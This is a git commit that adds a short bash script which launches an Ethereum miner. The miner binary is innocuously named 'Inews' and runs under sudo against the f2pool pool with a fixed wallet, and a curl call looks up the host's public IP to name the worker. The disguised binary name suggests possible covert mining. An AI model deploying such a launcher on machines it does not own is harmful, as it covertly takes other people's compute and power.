07610360f6fe8847e2c65e27558e572c4bde607d
dasa25 <80074409+dasa25@users.noreply.github.com>
2021-03-09 22:39:31 +0700

    Add files via upload

---
+++ vvc.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=eth.f2pool.com:6688
+WALLET=0x2dd9a734ffe4c75bbae173a13a5019b962eb1b76
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Catok
+
+cd "$(dirname "$0")"
+
+chmod +x ./Inews && sudo ./Inews -a ethash -o $POOL -u $WALLET.$WORKER $@
